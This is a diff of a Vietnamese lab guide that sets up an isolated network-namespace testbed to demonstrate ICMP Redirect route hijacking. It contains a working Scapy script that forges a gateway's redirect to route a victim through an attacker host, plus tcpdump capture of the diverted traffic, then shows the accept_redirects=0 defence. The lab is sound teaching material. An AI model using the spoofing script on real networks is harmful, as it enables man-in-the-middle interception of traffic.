@@ -11,132 +11,181 @@
 
 ---
 
-### 2. CÁCH 1: CHẠY NHANH TỪ CÁC SCRIPT CÓ SẴN
+### 2. BƯỚC 1: KHỞI TẠO THƯ MỤC VÀ TẠO CÁC SCRIPT
+
+Tạo thư mục `/tmp/lab05` và tạo 2 script bằng `cat << 'EOF'` (hoặc dùng `nano <tên_file>` để soạn thảo):
 
 ```bash
-# Bước 1: Khởi tạo topology 2 subnet và cấu hình định tuyến ban đầu
-sudo bash docs/progress/LAB05/scripts/setup_redirect.sh
+mkdir -p /tmp/lab05 && cd /tmp/lab05
 
-# Bước 2: Kiểm tra đường đi ban đầu (Baseline Route) trên vic
-sudo ip netns exec vic ip route get 10.0.1.5
-# (Kết quả: via 10.0.0.1 dev vic0)
+# 1. Script thiết lập mạng đa subnet: setup_redirect.sh
+cat << 'EOF' > /tmp/lab05/setup_redirect.sh
+#!/usr/bin/env bash
+set -e
 
-# Bước 3: Mở tcpdump trên card mạng atk0 để đón bắt lưu lượng MITM
-sudo ip netns exec atk sysctl -w net.ipv4.ip_forward=1 >/dev/null
-sudo ip netns exec atk timeout 10 tcpdump -i atk0 -nn host 10.0.1.5 &
-TCPDUMP_PID=$!
-sleep 1
+echo "[*] Dọn dẹp namespace cũ và bridge..."
+for ns in vic gw atk dst amp1 amp2 amp3 h1 h2; do
+    ip netns del "$ns" 2>/dev/null || true
+done
+ip link del br0 2>/dev/null || true
 
-# Bước 4: Tạo luồng giao tiếp trên vic và tiêm gói ICMP Redirect từ atk
-sudo ip netns exec vic python3 docs/progress/LAB05/scripts/trigger_flow.py &
-sleep 0.5
-sudo ip netns exec atk python3 docs/progress/LAB05/scripts/send_redirect.py
-sleep 1
+echo "[*] Tạo Linux Bridge br0 cho LAN 10.0.0.0/24..."
+ip link add name br0 type bridge
+ip link set dev br0 up
 
-# Bước 5: Kiểm tra bảng định tuyến trên vic sau khi bị tiêm gói
-sudo ip netns exec vic ip route get 10.0.1.5
-# (Kết quả: 10.0.1.5 via 10.0.0.66 dev vic0 cache <redirected>)
-
-# Bước 6: Nạn nhân ping thử và quan sát gói tin bị bắt tại atk0
-sudo ip netns exec vic ping -c 2 10.0.1.5
-wait $TCPDUMP_PID 2>/dev/null || true
-```
-
----
-
-### 3. CÁCH 2: CHẠY ĐỘC LẬP BẰNG COPY-PASTE (STANDALONE)
-
-Dán trực tiếp khối lệnh dưới đây vào Terminal Kali Linux:
-
-```bash
-# === 1. TẠO MẠNG ĐA SUBNET VÀ BẬT DỄ BỊ TẤN CÔNG ===
-for ns in vic gw atk dst; do sudo ip netns del $ns 2>/dev/null || true; done
-sudo ip link del br0 2>/dev/null || true
-sudo ip link add name br0 type bridge
-sudo ip link set dev br0 up
-
-add_lan() {
+add_lan_host() {
     local ns=$1; local ip=$2
-    sudo ip netns add "$ns"
-    sudo ip link add "veth_${ns}" type veth peer name "${ns}0"
-    sudo ip link set "${ns}0" netns "$ns"
-    sudo ip link set "veth_${ns}" master br0
-    sudo ip link set "veth_${ns}" up
-    sudo ip netns exec "$ns" ip link set dev lo up
-    sudo ip netns exec "$ns" ip addr add "${ip}/24" brd 10.0.0.255 dev "${ns}0"
-    sudo ip netns exec "$ns" ip link set dev "${ns}0" up
+    ip netns add "$ns"
+    ip link add "veth_${ns}" type veth peer name "${ns}0"
+    ip link set "${ns}0" netns "$ns"
+    ip link set "veth_${ns}" master br0
+    ip link set "veth_${ns}" up
+    ip netns exec "$ns" ip link set dev lo up
+    ip netns exec "$ns" ip addr add "${ip}/24" brd 10.0.0.255 dev "${ns}0"
+    ip netns exec "$ns" ip link set dev "${ns}0" up
 }
-add_lan "vic" "10.0.0.2"
-add_lan "gw"  "10.0.0.1"
-add_lan "atk" "10.0.0.66"
+add_lan_host "vic" "10.0.0.2"
+add_lan_host "gw"  "10.0.0.1"
+add_lan_host "atk" "10.0.0.66"
 
 # Tạo mạng WAN nối gw tới dst
-sudo ip netns add dst
-sudo ip netns exec dst ip link set dev lo up
-sudo ip link add gw-d type veth peer name d-gw
-sudo ip link set gw-d netns gw
-sudo ip link set d-gw netns dst
-sudo ip netns exec gw ip addr add 10.0.1.254/24 dev gw-d
-sudo ip netns exec gw ip link set dev gw-d up
-sudo ip netns exec dst ip addr add 10.0.1.5/24 dev d-gw
-sudo ip netns exec dst ip link set dev d-gw up
+ip netns add "dst"
+ip netns exec dst ip link set dev lo up
+ip link add "gw-d" type veth peer name "d-gw"
+ip link set "gw-d" netns "gw"
+ip link set "d-gw" netns "dst"
+ip netns exec gw ip addr add 10.0.1.254/24 dev gw-d
+ip netns exec gw ip link set dev gw-d up
+ip netns exec dst ip addr add 10.0.1.5/24 dev d-gw
+ip netns exec dst ip link set dev d-gw up
 
-# Cấu hình routing
-sudo ip netns exec gw sysctl -w net.ipv4.ip_forward=1 >/dev/null
-sudo ip netns exec vic ip route add default via 10.0.0.1 dev vic0
-sudo ip netns exec atk ip route add default via 10.0.0.1 dev atk0
-sudo ip netns exec dst ip route add default via 10.0.1.254 dev d-gw
+# Cấu hình routing & forwarding
+ip netns exec gw sysctl -w net.ipv4.ip_forward=1
+ip netns exec gw sysctl -w net.ipv4.conf.all.send_redirects=0
+ip netns exec vic ip route add default via 10.0.0.1 dev vic0
+ip netns exec atk ip route add default via 10.0.0.1 dev atk0
+ip netns exec dst ip route add default via 10.0.1.254 dev d-gw
 
-# Cấu hình vic chấp nhận Redirect
+# Cấu hình vic chấp nhận Redirect (Tái tạo điều kiện dễ bị tấn công)
 for k in all default vic0; do
-    sudo ip netns exec vic sysctl -w net.ipv4.conf.$k.accept_redirects=1 >/dev/null
-    sudo ip netns exec vic sysctl -w net.ipv4.conf.$k.secure_redirects=0 >/dev/null
+    ip netns exec vic sysctl -w net.ipv4.conf.$k.accept_redirects=1
+    ip netns exec vic sysctl -w net.ipv4.conf.$k.secure_redirects=0
 done
 
-# === 2. TIÊM GÓI ICMP REDIRECT GIẢ MẠO GATEWAY ===
-echo "[*] Kích hoạt luồng UDP trên vic và tiêm ICMP Redirect..."
-sudo ip netns exec vic python3 -c '
-import socket, time
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.bind(("10.0.0.2", 12345))
-s.connect(("10.0.1.5", 80))
-s.send(b"hello")
-time.sleep(1.5)
-' &
-sleep 0.3
+# Khởi động ARP cache
+ip netns exec vic ping -c 1 -W 1 10.0.0.1 >/dev/null 2>&1 || true
+ip netns exec vic ping -c 1 -W 1 10.0.0.66 >/dev/null 2>&1 || true
+ip netns exec atk ping -c 1 -W 1 10.0.0.1 >/dev/null 2>&1 || true
+ip netns exec gw  ping -c 1 -W 1 10.0.1.5 >/dev/null 2>&1 || true
 
-sudo ip netns exec atk python3 -c '
+echo "[+] Môi trường mạng Lab 05 đã sẵn sàng!"
+EOF
+chmod +x /tmp/lab05/setup_redirect.sh
+
+# 2. Script tiêm gói ICMP Redirect: send_redirect.py
+cat << 'EOF' > /tmp/lab05/send_redirect.py
+#!/usr/bin/env python3
 from scapy.all import IP, ICMP, UDP, send
-orig = IP(src="10.0.0.2", dst="10.0.1.5") / UDP(sport=12345, dport=80)
-redir = IP(src="10.0.0.1", dst="10.0.0.2") / ICMP(type=5, code=1, gw="10.0.0.66") / orig
-send(redir, verbose=0)
-print("[+] Đã gửi gói ICMP Redirect giả mạo gw=10.0.0.1 báo nexthop=10.0.0.66")
-'
-sleep 1
 
-# === 3. KIỂM TRA ROUTING CACHE BỊ BẺ LÁI ===
-echo "=== BẢNG ĐỊNH TUYẾN TRÊN VIC SAU KHI TIÊM ==="
-sudo ip netns exec vic ip route get 10.0.1.5
+LEGIT_GW = "10.0.0.1"
+VICTIM_IP = "10.0.0.2"
+ATTACKER_GW = "10.0.0.66"
+DEST_IP = "10.0.1.5"
+
+# Nhúng gói IP gốc khớp với luồng giao tiếp của ứng dụng (RFC 1122 4-tuple matching)
+orig = IP(src=VICTIM_IP, dst=DEST_IP) / UDP(sport=12345, dport=80)
+
+# ICMP Type 5 = Redirect, Code 1 = Host Redirect, gw = IP máy attacker
+redir = IP(src=LEGIT_GW, dst=VICTIM_IP) / ICMP(type=5, code=1, gw=ATTACKER_GW) / orig
+
+send(redir, verbose=0)
+print(f"[+] Đã tiêm gói ICMP Redirect giả mạo từ {LEGIT_GW}: Chuyển hướng đích {DEST_IP} qua {ATTACKER_GW}")
+EOF
 ```
 
 ---
 
-### 4. QUAN SÁT & TIÊU CHÍ THÀNH CÔNG
-1. **Trước tấn công:** Tuyến đường đi thẳng qua Gateway hợp pháp `via 10.0.0.1 dev vic0`.
-2. **Sau khi tiêm gói:** Tuyến đường đổi thành:
-   `10.0.1.5 via 10.0.0.66 dev vic0 src 10.0.0.2 cache <redirected> expires 295sec`.
-3. **Khi kích hoạt phòng thủ (`accept_redirects = 0`):**
-   ```bash
-   sudo ip netns exec vic sysctl -w net.ipv4.conf.all.accept_redirects=0
-   sudo ip netns exec vic ip route flush cache
-   ```
-   Tuyến đường giữ nguyên `via 10.0.0.1`, hoàn toàn loại bỏ nguy cơ bị chuyển hướng.
+### 3. BƯỚC 2: CHẠY THIẾT LẬP MẠNG & XÁC NHẬN BASELINE ROUTE
+
+```bash
+sudo bash /tmp/lab05/setup_redirect.sh
+
+# Kiểm tra đường đi ban đầu trên vic:
+sudo ip netns exec vic ip route get 10.0.1.5
+# Kỳ vọng: via 10.0.0.1 dev vic0
+```
 
 ---
 
-### 5. LỆNH DỌN DẸP MÔI TRƯỜNG
+### 4. BƯỚC 3: PHÁT ĐỘNG TẤN CÔNG & BẺ LÁI ĐỊNH TUYẾN
+
+1. Bật IP Forwarding trên `atk` để đóng vai trò Man-in-the-Middle:
+   ```bash
+   sudo ip netns exec atk sysctl -w net.ipv4.ip_forward=1
+   ```
+2. Mở `tcpdump` trên `atk0` đón bắt lưu lượng bị bẻ lái:
+   ```bash
+   sudo ip netns exec atk timeout 8 tcpdump -i atk0 -nn host 10.0.1.5 > /tmp/lab05/tcpdump_mitm.log 2>&1 &
+   sleep 1
+   ```
+3. Mở một socket UDP trên `vic` (chạy ngầm trong 2s) và tiêm gói ICMP Redirect từ `atk`:
+   ```bash
+   sudo ip netns exec vic python3 -c '
+   import socket, time
+   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+   s.bind(("10.0.0.2", 12345))
+   s.connect(("10.0.1.5", 80))
+   s.send(b"hello")
+   time.sleep(1.5)
+   ' &
+   sleep 0.3
+   sudo ip netns exec atk python3 /tmp/lab05/send_redirect.py
+   sleep 1
+   ```
+4. Kiểm tra bảng định tuyến trên `vic` ngay sau khi tiêm gói:
+   ```bash
+   sudo ip netns exec vic ip route get 10.0.1.5
+   ```
+   > **Quan sát:** Tuyến đường xuất hiện nhãn:  
+   > `10.0.1.5 via 10.0.0.66 dev vic0 src 10.0.0.2 cache <redirected> expires 295sec`.  
+   > Toàn bộ lưu lượng đã bị ép chuyển hướng qua máy `10.0.0.66`!
+
+5. Từ `vic`, gửi ping thử tới `10.0.1.5` để quan sát lưu lượng chảy qua attacker:
+   ```bash
+   sudo ip netns exec vic ping -c 2 10.0.1.5
+   sleep 2
+   cat /tmp/lab05/tcpdump_mitm.log
+   ```
+   > **Quan sát:** `atk0` bắt trọn các gói tin ICMP của nạn nhân gửi tới `10.0.1.5`.
+
+---
+
+### 5. BƯỚC 4: KÍCH HOẠT PHÒNG THỦ & KIỂM CHỨNG LẠI
+
+1. Tắt tính năng chấp nhận ICMP Redirect trên `vic` và xóa cache bị nhiễm độc:
+   ```bash
+   for k in all default vic0; do
+       sudo ip netns exec vic sysctl -w net.ipv4.conf.$k.accept_redirects=0
+   done
+   sudo ip netns exec vic ip route flush cache
+   ```
+2. Tiêm lại gói ICMP Redirect từ `atk`:
+   ```bash
+   sudo ip netns exec atk python3 /tmp/lab05/send_redirect.py
+   sleep 1
+   ```
+3. Kiểm tra lại bảng định tuyến của `vic`:
+   ```bash
+   sudo ip netns exec vic ip route get 10.0.1.5
+   ```
+   > **Quan sát:** Tuyến đường giữ nguyên `via 10.0.0.1`, hoàn toàn bỏ qua gói Redirect giả mạo.
+
+---
+
+### 6. BƯỚC 5: DỌN DẸP MÔI TRƯỜNG
+
 ```bash
 for ns in vic gw atk dst; do sudo ip netns del $ns 2>/dev/null || true; done
 sudo ip link del br0 2>/dev/null || true
+sudo rm -rf /tmp/lab05
 ```
-
